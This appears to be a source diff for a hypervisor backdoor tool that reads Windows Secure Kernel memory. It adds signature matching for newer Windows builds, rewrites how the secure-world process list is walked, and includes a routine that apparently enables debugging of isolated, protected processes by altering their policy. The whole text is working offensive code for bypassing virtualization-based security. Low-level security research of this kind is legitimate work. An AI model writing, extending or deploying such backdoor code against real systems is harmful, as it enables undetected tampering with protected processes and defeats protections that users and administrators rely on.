@@ -693,7 +693,7 @@ _end:
     return ret;
 }
 //--------------------------------------------------------------------------------------
-typedef int (* sk_process_callback)(SK_INFO *sk_info, uint64_t process_addr_virt, uint64_t process_addr_phys, void *ctx);
+typedef int (* sk_process_callback)(SK_INFO *sk_info, uint64_t process_addr_virt, void *ctx);
 
 uint32_t sk_process_flags = 0;
 uint32_t sk_process_pid = 0;
@@ -709,7 +709,47 @@ typedef struct _DEBUG_ENABLE_CTX
 
 } DEBUG_ENABLE_CTX;
 
-int sk_process_debug_enable(SK_INFO *sk_info, uint64_t process_addr_virt, uint64_t process_addr_phys, void *ctx)
+int sk_process_read_64(SK_INFO *sk_info, uint64_t addr_virt, uint64_t *val)
+{
+    uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;
+    uint64_t addr_phys = 0;
+
+    m_quiet = true;
+
+    // get physical address
+    if (backdoor_virt_translate(addr_virt, &addr_phys, pml4_addr, ept_addr) != 0)
+    {
+        m_quiet = false;
+        return -1;
+    }
+
+    m_quiet = false;
+
+    // read memory
+    return backdoor_phys_read_64(addr_phys, val);
+}
+
+int sk_process_read_32(SK_INFO *sk_info, uint64_t addr_virt, uint32_t *val)
+{
+    uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;
+    uint64_t addr_phys = 0;
+
+    m_quiet = true;
+
+    // get physical address
+    if (backdoor_virt_translate(addr_virt, &addr_phys, pml4_addr, ept_addr) != 0)
+    {
+        m_quiet = false;
+        return -1;
+    }
+
+    m_quiet = false;
+
+    // read memory
+    return backdoor_phys_read_32(addr_phys, val);
+}
+
+int sk_process_debug_enable(SK_INFO *sk_info, uint64_t process_addr_virt, void *ctx)
 {
     DEBUG_ENABLE_CTX *debug_enable = (DEBUG_ENABLE_CTX *)ctx;
     uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;
@@ -717,9 +757,9 @@ int sk_process_debug_enable(SK_INFO *sk_info, uint64_t process_addr_virt, uint64
     uint32_t ps_pid = 0;
 
     // read process information
-    if (backdoor_phys_read_32(process_addr_phys + sk_process_pid, &ps_pid) != 0 ||
-        backdoor_phys_read_64(process_addr_phys + sk_process_cr3, &ps_cr3) != 0 ||
-        backdoor_phys_read_64(process_addr_phys + sk_process_policy, &ps_policy) != 0)
+    if (sk_process_read_32(sk_info, process_addr_virt + sk_process_pid, &ps_pid) != 0 ||
+        sk_process_read_64(sk_info, process_addr_virt + sk_process_cr3, &ps_cr3) != 0 ||
+        sk_process_read_64(sk_info, process_addr_virt + sk_process_policy, &ps_policy) != 0)
     {
         return -1;
     }
@@ -816,11 +856,11 @@ int sk_process_debug_enable(SK_INFO *sk_info, uint64_t process_addr_virt, uint64
 
         free(policy);
     }
-
+ 
     return -1;
 }
 
-int sk_process_print(SK_INFO *sk_info, uint64_t process_addr_virt, uint64_t process_addr_phys, void *ctx)
+int sk_process_print(SK_INFO *sk_info, uint64_t process_addr_virt, void *ctx)
 {
     uint64_t pml4_addr = sk_info->Cr3, ept_addr = sk_info->EptAddr;
     uint64_t ps_flags = 0, ps_cr3 = 0, ps_policy = 0;
@@ -828,10 +868,10 @@ int sk_process_print(SK_INFO *sk_info, uint64_t process_addr_virt, uint64_t proc
     char ps_name[MAX_PATH] = "<unknown>";
 
     // read process information
-    if (backdoor_phys_read_64(process_addr_phys + sk_process_flags, &ps_flags) != 0 ||
-        backdoor_phys_read_32(process_addr_phys + sk_process_pid, &ps_pid) != 0 ||
-        backdoor_phys_read_64(process_addr_phys + sk_process_cr3, &ps_cr3) != 0 ||
-        backdoor_phys_read_64(process_addr_phys + sk_process_policy, &ps_policy) != 0)
+    if (sk_process_read_64(sk_info, process_addr_virt + sk_process_flags, &ps_flags) != 0 ||
+        sk_process_read_32(sk_info, process_addr_virt + sk_process_pid, &ps_pid) != 0 ||
+        sk_process_read_64(sk_info, process_addr_virt + sk_process_cr3, &ps_cr3) != 0 ||
+        sk_process_read_64(sk_info, process_addr_virt + sk_process_policy, &ps_policy) != 0)
     {
         return -1;
     }
@@ -1075,6 +1115,7 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
             for (uint32_t i = 0; i < text_size; i += 1)
             {
                 uint8_t *p = image + text_addr + i;
+                bool matched = false;
 
                 /*
                     Match securekernel!SkpsInitializeProcess() signature:
@@ -1100,6 +1141,38 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
                       *(p + 0x07) == 0x48 && *(p + 0x08) == 0x81 && *(p + 0x09) == 0xc1 &&
                       *(p + 0x0e) == 0x48 && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
                       *(p + 0x11) == 0x74))
+                {
+                    sk_process_flags    = 0x0000;
+                    sk_process_pid      = 0x0030;
+                    sk_process_cr3      = 0x0038;
+                    sk_process_list     = 0x00b0;
+                    sk_process_policy   = 0x0158;
+
+                    matched = true;
+                }
+                /*
+                    Windows 10 2004 and later variation:
+
+                        .text:000000014002C39E      lea     r8, SkpsProcessList
+                        .text:000000014002C3A5      lea     rcx, [rdi+0C8h]
+                        .text:000000014002C3AC      cmp     [rdx], r8
+                        .text:000000014002C3AF      jz      short loc_14002C3B8
+                */
+                else if (*(p + 0x00) == 0x4c && *(p + 0x01) == 0x8d && *(p + 0x02) == 0x05 &&
+                         *(p + 0x07) == 0x48 && *(p + 0x08) == 0x8d && *(p + 0x09) == 0x8f &&
+                         *(p + 0x0e) == 0x4c && *(p + 0x0f) == 0x39 && *(p + 0x10) == 0x02 &&
+                         *(p + 0x11) == 0x74 && *(p + 0x12) == 0x07)
+                {
+                    sk_process_flags    = 0x0000;
+                    sk_process_pid      = 0x0030;
+                    sk_process_cr3      = 0x0038;
+                    sk_process_list     = 0x00c8;
+                    sk_process_policy   = 0x0168;
+
+                    matched = true;
+                }
+
+                if (matched)
                 {
                     // get operand displacement
                     int32_t disp = *(int32_t *)(p + 3) + 7;
@@ -1167,32 +1240,19 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
     printf("[+] Secure kernel build number is %d\n", build);
     printf("[+] securekernel!SkpspProcessList is at 0x%llx\n", sk_process_list_virt);    
 
-    switch (build)
+    if (build != 10011)
     {
-    case 10011:
-
-        sk_process_flags    = 0x0000;
-        sk_process_pid      = 0x0030;
-        sk_process_cr3      = 0x0038;
-        sk_process_list     = 0x00b0;
-        sk_process_policy   = 0x0158;
-        break;
-
-    default:
-
         printf(__FUNCTION__"() ERROR: unsupported secure kernel build number\n");
         return -1;
-    }    
+    }            
 
-    LIST_ENTRY list_entry;    
+    uint64_t head = sk_process_list_virt, entry_virt = 0;
 
-    // read process list head
-    if (backdoor_phys_read(sk_process_list_phys, &list_entry, sizeof(list_entry)) != 0)
+    // read process list forward link
+    if (backdoor_phys_read_64(sk_process_list_phys, &entry_virt) != 0)
     {
         return -1;
     }
-
-    uint64_t head = sk_process_list_virt, entry_virt = (uint64_t)list_entry.Flink;
 
     // walk over the double linked list
     while (entry_virt != head)
@@ -1208,27 +1268,22 @@ int backdoor_sk_process_list(SK_INFO *sk_info, uint64_t sk_addr_virt, sk_process
             return -1;
         }
 
-        m_quiet = false;
+        m_quiet = false;  
 
-        // read process list entry
-        if (backdoor_phys_read(entry_phys, &list_entry, sizeof(list_entry)) != 0)
-        {
-            return -1;
-        }        
-
-        uint64_t addr_virt = entry_virt - sk_process_list;
-        uint64_t addr_phys = entry_phys - sk_process_list;
-        
         if (callback)
         {
-            if (callback(sk_info, addr_virt, addr_phys, ctx) != 0)
+            if (callback(sk_info, entry_virt - sk_process_list, ctx) != 0)
             {
                 // stop enumeration
                 break;
             }
         }
 
-        entry_virt = (uint64_t)list_entry.Flink;
+        // read process list entry
+        if (backdoor_phys_read_64(entry_phys, &entry_virt) != 0)
+        {
+            return -1;
+        }
     }
 
     return 0;
